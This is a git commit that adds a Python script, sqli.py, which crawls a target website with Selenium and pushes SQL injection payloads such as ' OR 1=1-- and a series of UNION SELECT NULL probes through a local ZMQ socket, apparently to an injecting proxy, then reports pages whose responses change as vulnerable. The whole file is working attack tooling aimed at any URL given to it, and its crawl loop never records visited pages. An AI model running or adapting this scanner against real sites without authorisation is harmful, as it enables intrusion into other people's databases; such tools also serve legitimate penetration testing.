b28cc4cf47df1bc215203a506777b138cc098d84
pointmeathesky <146136741+pointmeathesky@users.noreply.github.com>
2023-11-14 00:25:28 -0800

    Create sqli.py

---
+++ SQLi/sqli.py
@@ -0,0 +1,68 @@
+import sys
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+import zmq
+
+driver = webdriver.Firefox()
+url = sys.argv[1]
+driver.get(url)
+
+context = zmq.Context()
+socket = context.socket(zmq.PAIR)
+socket.connect("tcp://127.0.0.1:5555")
+
+
+def start_script(payload):
+    print(f"sending payload:{payload} over to script: " + payload)
+    socket.send_string(payload)
+
+
+def stop_script():
+    socket.send_string("stop")
+
+
+def test_payloads(page):
+    # send the paylaods, check if the response is a 400 or 500, if not compare original and new source  =
+    source = driver.page_source
+    union_select = "' UNION SELECT NULL--", "' UNION SELECT NULL, NULL--", "' UNION SELECT NULL, NULL, NULL--", "' UNION SELECT NULL, NULL, NULL, NULL--", "' UNION SELECT NULL, NULL, NULL, NULL, NULL--"
+    for payload in union_select:
+        start_script(payload)
+        driver.get(page)
+        stop_script()
+        status = socket.recv_string()
+        new_source = driver.page_source
+        if source != new_source and status[0] != "4" and status[0] != "5":
+            print("this page is vulnerable to SQLi")
+            return True
+
+
+def crawl_site():
+    links = []
+    already_visited = set()
+    found_endpoint = False
+    tests = [ "--", "'+OR+1=1--", "' OR 1=1--"]
+    while not found_endpoint:
+        page_links = driver.find_elements(By.XPATH, "//a[@href]")
+        for link in page_links:
+            print(link.get_attribute("href"))
+            if link.get_attribute("href") not in links and url in link.get_attribute("href") and link.get_attribute("href") not in already_visited:
+                links.append(link.get_attribute("href"))
+        next_page = links.pop()
+        driver.get(next_page)
+        # go through basic sql payloads that may indicate a vulnerability to find vulnerable areas on the site to test further
+        for test in tests:
+            print(test)
+            start_script(test)
+            driver.get(next_page)
+            new_source = driver.page_source
+            stop_script()
+            if test in new_source:
+                print("it's reflecting " + test)
+                # we think it may be vulnerable so call new function up to test more advanced payloads
+                if test_payloads(next_page):
+                    return True
+        stop_script()
+
+
+if __name__ == "__main__":
+    crawl_site()
